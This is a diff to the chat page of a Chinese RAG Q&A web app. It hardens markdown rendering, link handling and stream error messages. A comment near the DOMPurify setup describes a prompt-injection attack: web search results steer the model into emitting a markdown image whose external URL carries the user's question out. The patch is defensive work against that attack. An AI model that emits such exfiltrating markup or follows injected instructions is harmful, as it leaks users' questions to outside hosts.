@@ -4,6 +4,8 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
+<!-- 点开外部链接时不带上本站地址 -->
+<meta name="referrer" content="no-referrer">
 <title>智能问答 · KnowLearn</title>
 <link rel="stylesheet" href="/css/app.css">
 <style>
@@ -135,18 +137,37 @@
 <!-- marked：Markdown 转 HTML；DOMPurify：清洗 HTML 防止 XSS（均为本地文件） -->
 <script src="/vendor/marked.min.js"></script>
 <script src="/vendor/purify.min.js"></script>
-<script src="/js/common.js"></script>
+<!-- ?v=：common.js 有改动时更新版本号，避免浏览器用缓存的旧文件（新页面会调用旧文件里没有的函数） -->
+<script src="/js/common.js?v=20261116"></script>
 <script>
 const $ = id => document.getElementById(id);
 const CT = { course_intro: '课程介绍', doc_chunk: '文档片段', project_material: '项目资料', question: '题目' };   // 内容类型显示名
 // 处理阶段：与后端 progress 事件的 stage 对应
 const STAGES = [['rewrite', '理解问题'], ['retrieve', '检索中'], ['rerank', '整理结果'], ['generate', '生成答案']];
+const STREAM_BROKEN = '连接中断，回答可能不完整，请重试';   // 流意外结束或连接被重置时的提示
 const DEGRADE = '联网搜索暂不可用';   // 后端联网降级时 progress 消息包含这段文字
 const LS_KEY = 'knowlearn_session_id';   // 记住上次打开的会话
 const EXAMPLES = [
   ['📚 课程推荐', '有哪些编程相关的入门课程？'], ['🧭 课程详情', '通用编程项目班的详情'],
   ['📖 文档检索', 'FastAPI 的路径参数怎么做类型校验？'], ['📝 题目检索', '查询函数相关的选择题'],
 ];
+// ---- 答案正文的安全渲染（审计 A5） ----
+// 答案由大模型生成，参考资料（尤其是网络搜索结果）中的提示注入可能让模型输出
+// ![x](https://外部地址/?q=用户问题)，浏览器渲染时会真的向外部发请求，造成问题外泄。
+// 因此答案正文中不渲染任何图片（知识库图片由系统在答案下方单独展示），只允许排版所需的标签和属性，
+// 链接只允许 http(s)，并强制在新窗口打开、不带来源信息。
+marked.use({ renderer: { image(href, title, text) { return esc(text ? `[图片：${text}]` : '[图片]'); } } });
+const MD_PURIFY = {
+  ALLOWED_TAGS: ['p', 'br', 'hr', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'strong', 'b', 'em', 'i', 'del', 's', 'code', 'pre',
+    'blockquote', 'ul', 'ol', 'li', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'a', 'span', 'div', 'sup', 'sub', 'kbd'],
+  ALLOWED_ATTR: ['href', 'title', 'class', 'align', 'start'],
+};
+DOMPurify.addHook('afterSanitizeAttributes', node => {
+  if (node.tagName !== 'A') return;
+  if (!isHttpUrl(node.getAttribute('href'))) { node.removeAttribute('href'); return; }
+  node.setAttribute('target', '_blank');
+  node.setAttribute('rel', 'noopener noreferrer');
+});
 // gfm：支持表格等 GitHub 语法；breaks：单个换行也换行
 marked.setOptions({ gfm: true, breaks: true });
 
@@ -222,7 +243,7 @@ $('newSess').addEventListener('click', () => {   // 不立即调用 B1，发送�
 // ================= 消息渲染（交互设计 3.4） =================
 /** Markdown → 经过清洗的 DOM 节点。 */
 function renderMarkdown(text) {
-  const html = DOMPurify.sanitize(marked.parse(text || ''));
+  const html = DOMPurify.sanitize(marked.parse(text || ''), MD_PURIFY);
   const box = document.createElement('div'); box.innerHTML = html;
   return box;
 }
@@ -254,7 +275,7 @@ function decorateCitations(box, sources) {
 function srcCard(s) {
   if (s.source_type === 'web') {
     return `<div class="src web" data-n="${s.index}"><div class="h"><span class="n">[${s.index}]</span><span class="tag web">网络</span></div>
-      <div class="main-line"><a href="${esc(s.url)}" target="_blank" rel="noopener">${esc(s.title || s.url)}</a></div>
+      <div class="main-line">${isHttpUrl(s.url) ? `<a href="${esc(s.url)}" target="_blank" rel="noopener noreferrer">${esc(s.title || s.url)}</a>` : esc(s.title || s.url)}</div>
       <div class="kv" title="${esc(s.url)}">${esc(s.url)}</div>${s.snippet ? `<div class="snip">${esc(s.snippet)}</div>` : ''}</div>`;
   }
   let main, lines = [];
@@ -268,7 +289,7 @@ function srcCard(s) {
   }
   return `<div class="src" data-n="${s.index}"><div class="h"><span class="n">[${s.index}]</span><span class="tag">${CT[s.content_type] || '资料'}</span></div>
     <div class="main-line" title="${esc(main)}">${esc(main)}</div>${lines.map(l => `<div class="kv" title="${l}">${l}</div>`).join('')}
-    ${s.file_name ? `<div class="kv">📄 ${s.file_url ? `<a href="${esc(s.file_url)}" target="_blank" rel="noopener">${esc(s.file_name)}</a>` : esc(s.file_name)}</div>` : ''}
+    ${s.file_name ? `<div class="kv">📄 ${isHttpUrl(s.file_url) ? `<a href="${esc(s.file_url)}" target="_blank" rel="noopener noreferrer">${esc(s.file_name)}</a>` : esc(s.file_name)}</div>` : ''}
     ${s.snippet ? `<div class="snip">${esc(s.snippet)}</div>` : ''}</div>`;
 }
 /**
@@ -304,7 +325,7 @@ function botBody(m) {
   }
   if (done && m.images && m.images.length) {
     // 图片加载失败时替换为文字提示
-    wrap.insertAdjacentHTML('beforeend', `<div class="imgs">${m.images.map(im => `<div class="img" data-url="${esc(im.url)}" title="点击查看原图">
+    wrap.insertAdjacentHTML('beforeend', `<div class="imgs">${m.images.filter(im => isHttpUrl(im.url)).map(im => `<div class="img" data-url="${esc(im.url)}" title="点击查看原图">
       <img src="${esc(im.url)}" alt="${esc(im.caption)}" loading="lazy" onerror="this.outerHTML='<div class=&quot;broken&quot;>图片加载失败</div>'">
       <div class="cap">${esc(im.caption)}（来源 [${im.source_index}]）</div></div>`).join('')}</div>`);
   }
@@ -437,7 +458,8 @@ async function ask(text) {
         const block = buf.slice(0, idx); buf = buf.slice(idx + 2);
         const ev = (block.match(/^event: (.*)$/m) || [])[1], raw = (block.match(/^data: (.*)$/m) || [])[1];
         if (!ev || raw === undefined) continue;
-        const d = JSON.parse(raw);
+        let d;
+        try { d = JSON.parse(raw); } catch (err) { console.warn('忽略无法解析的事件', ev, raw); continue; }
         if (ev === 'progress') { if (d.message && d.message.includes(DEGRADE)) bot.degraded = true; else bot.progress = d.stage; }
         else if (ev === 'sources') { bot.sources = d.sources; bot.images = d.images; }   // 先暂存，done 后再显示（交互决策 I4）
         else if (ev === 'delta') { bot.content += d.text; bot.progress = 'generate'; }
@@ -447,14 +469,20 @@ async function ask(text) {
       }
     }
     // 流结束了却没收到 done / error，视为连接中断
-    if (bot.status === 'streaming') { bot.status = 'failed'; bot.error = '连接中断'; bot.progress = null; }
+    if (bot.status === 'streaming') { bot.status = 'failed'; bot.error = STREAM_BROKEN; bot.progress = null; }
   } catch (e) {
     bot.progress = null;
     if (e.name === 'AbortError') { bot.status = 'interrupted'; }
     // 40901 会话忙、40402 会话不存在：问题没有被受理，撤回刚追加的两条消息
     else if (e.code === 40901) { messages.splice(-2, 2); renderMessages(); toast('上一个问题还在回答中', true); }
     else if (e.code === 40402) { messages.splice(-2, 2); toast('会话已不存在', true); cur = null; loadSessions(); }
-    else { bot.status = 'failed'; bot.error = e.message || '连接中断'; }
+    // 业务错误（ApiError）的提示来自后端，可以直接展示；其他异常（如连接被重置时浏览器抛出的
+    // TypeError「network error」）是英文技术信息，统一换成可读的中文提示，原始信息留在控制台
+    else {
+      bot.status = 'failed';
+      if (e instanceof ApiError) bot.error = e.message;
+      else { console.warn('问答连接异常', e); bot.error = STREAM_BROKEN; }
+    }
   } finally {
     if (pending) clearTimeout(pending);
     if (messages.includes(bot)) updateLast();
